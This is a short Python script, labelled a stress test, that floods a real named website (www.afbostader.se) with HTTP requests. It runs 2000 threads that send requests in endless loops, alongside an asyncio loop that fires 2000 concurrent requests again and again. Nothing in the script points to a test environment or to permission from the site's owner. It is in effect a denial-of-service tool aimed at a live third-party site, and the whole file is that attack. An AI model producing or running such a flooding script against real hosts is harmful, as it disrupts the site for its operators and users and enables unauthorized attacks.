import threading
import requests
import time
import asyncio
import aiohttp

url = 'https://www.afbostader.se'
number_of_threads = 2000
requests_per_thread = 2000 
duration = 6000

def send_requests():
    session = requests.Session()
    session.headers.update({'Connection': 'keep-alive'})
    while True:
        try:
            response = session.get(url, timeout=5)
            print(f"Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

async def send_request(session):
    try:
        async with session.get(url) as response:
            print(f"Status code: {response.status}")
    except aiohttp.ClientError as e:
        print(f"Request failed: {e}")

async def aiohttp_main():
    connector = aiohttp.TCPConnector(limit_per_host=number_of_threads)
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            tasks = [send_request(session) for _ in range(number_of_threads)]
            await asyncio.gather(*tasks)

def start_aiohttp_stress_test():
    asyncio.run(aiohttp_main())

def start_requests_stress_test():
    threads = []
    for _ in range(number_of_threads):
        thread = threading.Thread(target=send_requests)
        threads.append(thread)
        thread.start()

    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(1)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    aiohttp_thread = threading.Thread(target=start_aiohttp_stress_test)
    aiohttp_thread.start()

    start_requests_stress_test()

    aiohttp_thread.join()
